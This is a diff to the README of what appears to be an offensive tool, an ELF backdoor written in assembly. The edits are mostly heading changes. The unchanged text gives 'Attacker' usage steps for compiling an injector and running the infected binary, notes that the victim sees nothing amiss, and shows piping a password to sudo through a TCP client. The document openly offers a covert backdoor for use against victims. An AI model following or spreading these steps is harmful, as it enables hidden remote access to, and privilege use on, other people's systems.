@@ -1,8 +1,9 @@
-# Simple-elf-backdoor
+# elf_backdoor
 
 It is an elf backdoor written in pure assembly language.
 
-## Usage
+# Usage
+## Attacker
 ### backdoor
 ```bash
 $ gcc elfinject.c -o elfinject -lelf
@@ -20,15 +21,15 @@ $ ./elftarget
 ```
 The victim uses the original program without problems and Attackers use backdoors.
 
-## Demo
-### backdoor
+# Demo
+## backdoor
 ![backdoor](https://github.com/gbdngb12/Simple-elf-backdoor/assets/104804087/84720f5f-7caf-45aa-b28a-00632b779317)
 
-### backdoor_client
+## backdoor_client
 ![client](https://github.com/gbdngb12/Simple-elf-backdoor/assets/104804087/29cf4cf6-bf88-456f-8cc2-052c8ae33f0c)
 
-## Tips
-### How to use sudo
+# Tips
+## How to use sudo
 ```bash
 $ python3 tcpClient
 echo "password" | sudo -S <command>
